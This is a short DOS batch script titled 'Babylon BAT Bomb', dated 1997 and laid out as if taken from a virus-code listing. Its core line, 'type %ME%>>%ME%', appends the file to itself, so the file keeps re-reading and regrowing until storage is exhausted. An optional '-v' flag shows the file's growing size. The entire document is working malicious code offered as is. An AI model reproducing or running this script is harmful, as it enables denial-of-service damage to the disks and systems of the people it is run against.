@echo off                                          |
rem Babylon BAT Bomb (C) AtH//HPG,8Nov97           |
set ME=%0                                          |
if not exist %0 set ME=%0.bat                      |(5 )
type %ME%>>%ME%                                    |
if not %1v==-vv goto silent                        |
dir %ME%|find "BAT"                                |
:silent                                            |
